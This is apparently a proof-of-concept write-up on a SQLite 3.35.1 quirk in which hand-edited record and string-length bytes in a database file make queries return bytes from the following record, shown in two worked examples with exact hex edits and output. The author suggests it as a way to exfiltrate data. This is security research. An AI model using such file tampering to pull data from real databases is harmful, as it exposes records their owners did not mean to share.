# Record Leaking

So this is a POC guide for a cool trick I found in sqlite. it's a bit niche, however it does have some imaginable applications. Effectively using maliciously crafted records, you can leak subsequent records. This was done in sqlite3 version `3.35.1`, which at the time of this writing, is the latest version (in case you don't believe me):

```
$    ./sqlite3
SQLite version 3.35.1 2021-03-15 16:53:57
Enter ".help" for usage hints.
```

There will be a brief explanation, followed by two examples of this. For the examples, check in the `examples` file for the db files, along with the executable.

## Explanation

So sqlite is using a paging mechanism in order to handle it's memory. There is some custom memory allocation functionality for dealing with this. The database files that save the database are just straight memory pages. As such, this attack revolves around overwriting particular values in the database file, so when we query one record, it will leak data past the record. This is why it's a bit of a niche attack. However it can still have some applications, such as providing a new way to exfil data from the perspective of a client querying a database, or maybe if you're trying to access data that is only in memory (I haven't reversed out the in memory functionality, so not too sure on the feasibility of that), or any number of weird circumstances.

I'll release more docs about how exactly the internal memory layout and some other functionalities work, but this is the gist. For records that store strings, they store a value which represents the size of the string. When a record goes to read a string, it looks at that size and takes its word for it. We will just overwrite that value with a larger value. This will expand the string, and can either move it or other columns into subsequent records. We will also expand the size of the record itself to match it. This is to pass a series of checks it does, to hopefully prevent shenanigans like this. Then when we query that record, we will also get data from proceeding records.

## Example 0

This is going to be a simple example where we just leak 1 byte from the next record's metadata. This is the table we will be working with:

```
sqlite> CREATE TABLE x (y varchar(100), z int);
```

With these records:

```
sqlite> select * from x;
15935728|100
15935728|200
75395128|300
15935728|400
15935728|500
```

Now for this, we will edit the record with the `75395128`. Currently, it has these bytes:

```
0D 03 03 1D 02 37 35 33 39 35 31 32 38 01 2C
```

Which have these specific values:

```
Record Length: 0x0D (13 bytes)
Length of String: 0x08 (((0x1D - 12) / 2), check other pages for explanation)
```

We will change these values to be this:

```
Record Length: 0x0E
Length of String: 0x1F (string length of 9)
```

Which becomes these bytes. So effectively we just extended the string length by one, along with the length of the record:

```
0E 03 03 1F 02 37 35 33 39 35 31 32 38 01 2c
```

Now the records look like this:

```
sqlite> select * from x;
15935728|100
15935728|200
75395128|11277
15935728|400
15935728|500
```

Now the `z` int value for the `75395128` has changed to be `11277`, which in hex is `0x2c0d`. Effectively what we have done is we moved this value over by one byte, so the `0x2c` is the higher byte. Also if we look at the next record over, we see that it starts with `0x0d`, which we are leaking here. The bytes that end this record, and move onto the next look like this:

```
01 2C 0D 02 03
```

The `0x0D` value we are leaking from the next record signifies the size of that record.


## Example 1

For this example, we have this table:

```
sqlite> CREATE TABLE x (y varchar(100));
```

With these records:
```
sqlite> select * from x;
15935728
15935728
75395128
15935728
15935728
```

So for here, we are going to leverage the `75395128` row to leak part of the following row. For that, let's first take a look at the bytes that comprise those records:

```
0A 03 02 1D 37 35 33 39 35 31 32 38
0A 02 02 1D 31 35 39 33 35 37 32 38
```

Now for this, we are simply going to extend the length of the string column, into the next row. I want to leak the `159` from the proceeding row. So we can see that the `159` (`31 35 39`) is `4` bytes away from the end of the string. So to leak those three bytes, we will need to extend the string by `4 + 3 = 7` bytes. As such we will need to increase the size of the record, and the length of the string by seven. So the record length will be `0x11`, and the string length will be `0x0F` (which encoded in sqlite3 format is `0x2B`):


```
11 03 02 2B 37 35 33 39 35 31 32 38
0A 02 02 1D 31 35 39 33 35 37 32 38
```

Now one thing to note, there is a newline character `0x0A` in between them. As such, we should also leak a newline. And when we try running a query, we see that we are getting a record leak:

```
sqlite> select * from x;
15935728
15935728
75395128
159
15935728
15935728
```
